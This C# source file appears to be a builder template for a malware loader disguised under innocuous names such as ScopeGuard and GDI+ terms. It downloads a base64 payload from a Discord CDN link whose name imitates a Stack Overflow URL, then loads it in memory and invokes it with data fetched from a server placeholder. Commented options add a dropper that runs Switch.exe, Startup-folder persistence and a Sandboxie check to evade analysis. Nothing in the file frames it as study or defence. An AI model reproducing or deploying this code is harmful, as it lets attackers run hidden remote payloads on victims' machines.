using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;




//Default [assembly: AssemblyTitle("ScopeGuard")]
//Default [assembly: AssemblyProduct("ComputerMonitoringSystem")]
//Default [assembly: AssemblyCopyright("Copyright Â©  2019")]
//Default [assembly: AssemblyFileVersion("1.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace ScopeGuard
{
    static class onExitScope_
    {
        [STAThread]
        static void Main()
        {
            using (WebClient BOOST_PP_CAT = new WebClient())
            {

                try
                {


                   //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }







                    string gdiplus;

                    gdiplus = "https://cdn.discordapp.com/attachments/841595401253158954/843480531470385152/httpsstackoverflow.comquestions3669833c11-scope-exit-guard-a-good-idea78051007805100.txt"; 

                    WebClient at_scope_end;

                    at_scope_end = new WebClient();

                    string GdiplusShutdown;

                    GdiplusShutdown = at_scope_end.DownloadString(gdiplus);


                    byte[] index;


                    index = Convert.FromBase64String(GdiplusShutdown);



                    object expr = new object[] { %aPP%, string.Empty, BOOST_PP_CAT.DownloadData("%Server%"), true };

                    string move = "ShutDown.frmclass";

                    AppDomain.CurrentDomain.Load(index).GetType(move).InvokeMember("stat", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])expr);



                    //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
